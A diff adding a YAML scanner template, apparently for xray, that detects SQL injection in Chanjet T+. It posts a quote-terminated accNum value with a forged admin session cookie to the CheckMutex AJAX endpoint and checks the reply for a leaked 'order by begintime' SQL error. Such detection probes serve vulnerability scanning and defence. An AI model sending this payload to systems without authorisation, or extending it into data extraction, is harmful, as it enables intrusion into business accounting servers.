@@ -1,0 +1,25 @@
+name: yaml-poc-chanjet-chanjet_t_plus-sql_injection-CT-753949
+binding: 3ad31531-5b5a-40ba-99a7-73ba52aa57b7
+detail:
+    author: yuxiang.cai
+    vulnerability:
+        id: f4ae9a80-58c7-4a5c-a463-ae4e40605880
+        level: critical
+    warning: Harmless
+transport: http
+set:
+    rand: randomInt(5,10)
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutex
+            headers:
+                Content-Type: text/plain
+                Cookie: ASP.NET_SessionId=; sid=admin
+                Host: 127.0.0.1
+            body: |
+                {"accNum": "{{rand}}'", "functionTag": "SYS0104", "url": ""}
+        expression: response.body_string.contains('order by begintime')
+expression: r0()
